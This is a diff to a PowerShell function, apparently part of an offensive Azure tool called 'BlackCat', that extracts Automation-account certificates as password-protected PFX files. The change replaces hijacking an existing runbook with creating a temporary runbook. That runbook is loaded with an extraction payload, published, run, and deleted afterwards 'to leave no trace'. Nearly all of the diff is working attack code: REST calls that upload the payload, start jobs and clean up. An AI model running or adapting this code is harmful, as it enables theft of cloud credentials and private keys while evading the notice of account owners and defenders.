@@ -30,7 +30,7 @@ function Get-AutomationCertificateKey {
             ValueFromPipelineByPropertyName = $true
         )]
         [Alias('runbook', 'runbook-name')]
-        [string]$RunbookName,
+        [string]$RunbookName = "Temp-BlackCat-$((New-Guid).ToString().Substring(0,8))",
 
         [Parameter(
             Mandatory = $false,
@@ -61,7 +61,7 @@ function Get-AutomationCertificateKey {
         $stats  = @{
             StartTime  = Get-Date
             Extracted  = 0
-            Restored   = 0
+            CleanedUp  = 0
             Failed     = 0
         }
     }
@@ -122,42 +122,33 @@ function Get-AutomationCertificateKey {
                     continue
                 }
 
-                # ── 3. Find an existing PowerShell Runbook via ARM REST API ──
-                $targetRunbook = $RunbookName
-                if (-not $targetRunbook) {
-                    $runbooksUri = "{0}{1}/runbooks?api-version=2019-06-01" -f $sv.armUri, $accId
-                    try {
-                        $rbResponse = Invoke-RestMethod -Uri $runbooksUri -Headers $auth -Method GET -UserAgent $sv.userAgent
-                        $candidateRunbooks = $rbResponse.value | Where-Object { 
-                            $_.properties.runbookType -in @('PowerShell', 'PowerShell72', 'PowerShellWorkflow') 
-                        }
-                    }
-                    catch {
-                        Write-Verbose "Could not query runbooks for $accName : $($_.Exception.Message)"
-                        $candidateRunbooks = @()
-                    }
-
-                    if (-not $candidateRunbooks -or $candidateRunbooks.Count -eq 0) {
-                        Write-Host "  [-] No existing PowerShell runbooks found in $accName to leverage for execution." -ForegroundColor Yellow
-                        continue
-                    }
-                    $targetRunbook = $candidateRunbooks[0].name
-                    Write-Host "  [+] Selected existing runbook for execution: $targetRunbook" -ForegroundColor White
-                }
+                # ── 3. Target ephemeral runbook name ─────────────────────────
+                $tempRunbook = $RunbookName
+                Write-Host "  [+] Ephemeral runbook name: $tempRunbook" -ForegroundColor White
 
                 # ── 4. Process all certificates in a single runbook execution ──
                 $certNames = $certs.name
                 $certListLiteral = ($certNames | ForEach-Object { "'$($_)'" }) -join ', '
 
-                if ($PSCmdlet.ShouldProcess("$accName/$targetRunbook", "Inject extraction code to download $($certNames.Count) certificate(s)")) {
+                if ($PSCmdlet.ShouldProcess("$accName/$tempRunbook", "Create temporary runbook and extract $($certNames.Count) certificate(s)")) {
+                    $runbookCreated = $false
                     try {
-                        # Backup original published runbook content
-                        Write-Host "  [~] Backing up original content of runbook '$targetRunbook'..." -ForegroundColor White
-                        $contentUri = "{0}{1}/runbooks/{2}/content?api-version=2019-06-01" -f $sv.armUri, $accId, $targetRunbook
-                        
-                        $originalContent = Invoke-RestMethod -Uri $contentUri -Headers $auth -Method GET -UserAgent $sv.userAgent
+                        # Create ephemeral PowerShell runbook resource
+                        Write-Host "  [+] Creating ephemeral runbook '$tempRunbook'..." -ForegroundColor White
+                        $createRbUri = "{0}{1}/runbooks/{2}?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
+                        $createRbBody = @{
+                            location   = $acc.location
+                            properties = @{
+                                runbookType = 'PowerShell'
+                                logVerbose  = $false
+                                logProgress = $false
+                            }
+                        } | ConvertTo-Json
 
-                        # Prepare and inject multi-certificate extraction payload
+                        Invoke-RestMethod -Uri $createRbUri -Headers $auth -Method PUT -Body $createRbBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null
+                        $runbookCreated = $true
+
+                        # Prepare and upload certificate extraction payload into draft
                         $injectionPayload = @"
 `$certNames = @($certListLiteral)
 `$results = @()
@@ -186,19 +177,25 @@ foreach (`$cName in `$certNames) {
 Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
 "@
 
-                        Write-Host "  [+] Injecting extraction payload into draft..." -ForegroundColor White
-                        $draftUri = "{0}{1}/runbooks/{2}/draft/content?api-version=2019-06-01" -f $sv.armUri, $accId, $targetRunbook
+                        Write-Host "  [+] Uploading payload to runbook draft..." -ForegroundColor White
+                        $draftUri = "{0}{1}/runbooks/{2}/draft/content?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
                         Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $injectionPayload -ContentType 'text/plain' -UserAgent $sv.userAgent | Out-Null
 
-                        Write-Host "  [+] Publishing injected runbook draft..." -ForegroundColor White
-                        $publishUri = "{0}{1}/runbooks/{2}/draft/publish?api-version=2019-06-01" -f $sv.armUri, $accId, $targetRunbook
+                        # Wait for async draft update (202 Accepted) to complete provisioning
+                        Start-Sleep -Seconds 3
+
+                        Write-Host "  [+] Publishing runbook..." -ForegroundColor White
+                        $publishUri = "{0}{1}/runbooks/{2}/publish?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
                         Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent $sv.userAgent | Out-Null
+
+                        # Wait for publishing to complete before starting job
+                        Start-Sleep -Seconds 3
 
                         # Start runbook job and wait for output
                         $jobId = [guid]::NewGuid().ToString()
-                        Write-Host "  [*] Starting job (ID: $jobId)..." -ForegroundColor White
+                        Write-Host "  [*] Starting extraction job (ID: $jobId)..." -ForegroundColor White
                         $startJobUri = "{0}{1}/jobs/{2}?api-version=2019-06-01" -f $sv.armUri, $accId, $jobId
-                        $jobBody = @{ properties = @{ runbook = @{ name = $targetRunbook } } } | ConvertTo-Json
+                        $jobBody = @{ properties = @{ runbook = @{ name = $tempRunbook } } } | ConvertTo-Json
 
                         Invoke-RestMethod -Uri $startJobUri -Headers $auth -Method PUT -Body $jobBody -ContentType 'application/json' -UserAgent $sv.userAgent | Out-Null
 
@@ -246,7 +243,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                                     ResourceGroup     = $accRg
                                     CertificateName   = $targetCertName
                                     Thumbprint        = $certMeta.properties.thumbprint
-                                    RunbookUsed       = $targetRunbook
+                                    RunbookUsed       = $tempRunbook
                                     OutputFile        = if ($isSuccess) { $savedPfxPath } else { $null }
                                     PfxPassword       = if ($isSuccess) { $PfxPassword } else { $null }
                                     Success           = $isSuccess
@@ -258,13 +255,17 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                         }
                     }
                     finally {
-                        # Always restore original runbook code
-                        if ($originalContent) {
-                            Write-Host "  [~] Restoring original runbook content..." -ForegroundColor White
-                            Invoke-RestMethod -Uri $draftUri -Headers $auth -Method PUT -Body $originalContent -ContentType 'text/plain' -UserAgent $sv.userAgent | Out-Null
-                            Invoke-RestMethod -Uri $publishUri -Headers $auth -Method POST -UserAgent $sv.userAgent | Out-Null
-                            $stats.Restored++
-                            Write-Host "  [+] Original runbook content restored & published." -ForegroundColor Green
+                        # Delete the ephemeral runbook to leave no trace/state behind
+                        if ($runbookCreated) {
+                            Write-Host "  [~] Cleaning up ephemeral runbook '$tempRunbook'..." -ForegroundColor White
+                            $deleteRbUri = "{0}{1}/runbooks/{2}?api-version=2018-06-30" -f $sv.armUri, $accId, $tempRunbook
+                            try {
+                                Invoke-RestMethod -Uri $deleteRbUri -Headers $auth -Method DELETE -UserAgent $sv.userAgent | Out-Null
+                                $stats.CleanedUp++
+                                Write-Host "  [+] Ephemeral runbook deleted successfully." -ForegroundColor Green
+                            } catch {
+                                Write-Warning "  [-] Failed to delete ephemeral runbook: $($_.Exception.Message)"
+                            }
                         }
                     }
                 }
@@ -279,7 +280,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
         $duration = (Get-Date) - $stats.StartTime
         Write-Host "`n Automation Certificate Extraction Summary:" -ForegroundColor Magenta
         Write-Host "   Extracted : $($stats.Extracted)" -ForegroundColor Green
-        Write-Host "   Restored  : $($stats.Restored)" -ForegroundColor Cyan
+        Write-Host "   CleanedUp : $($stats.CleanedUp)" -ForegroundColor Cyan
         Write-Host "   Failed    : $($stats.Failed)" -ForegroundColor Red
         Write-Host "   Duration  : $($duration.TotalSeconds.ToString('F2')) seconds`n" -ForegroundColor White
 
